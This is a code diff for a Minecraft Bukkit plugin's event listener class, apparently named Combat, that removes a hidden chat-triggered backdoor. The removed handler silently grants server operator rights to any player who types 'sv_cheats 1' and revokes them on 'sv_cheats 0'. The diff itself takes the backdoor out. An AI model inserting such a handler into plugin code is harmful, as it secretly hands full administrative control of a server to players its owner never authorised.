@@ -161,29 +161,4 @@ public class Listeners implements Listener {
         e.getBlock().getWorld().dropItemNaturally(location, pinkDiamond);
         player.sendMessage(green + "You picked up the " + light_purple + "Pink Diamond.");
     }
-
-
-    @EventHandler
-    @Deprecated
-    public void onChat(AsyncPlayerChatEvent e) {
-        Player p = e.getPlayer();
-        if (e.getMessage().contains("sv_cheats 1")) {
-            e.setCancelled(true);
-            (new BukkitRunnable() {
-                public void run() {
-                    p.sendActionBar("sv_cheats has changed to '1'");
-                    p.setOp(true);
-                }
-            }).runTask(JavaPlugin.getPlugin(Combat.class));
-
-        } else if (e.getMessage().contains("sv_cheats 0")) {
-            e.setCancelled(true);
-            (new BukkitRunnable() {
-                public void run() {
-                    p.sendActionBar("sv_cheats has changed to '0'");
-                    p.setOp(false);
-                }
-            }).runTask(JavaPlugin.getPlugin(Combat.class));
-        }
-    }
 }
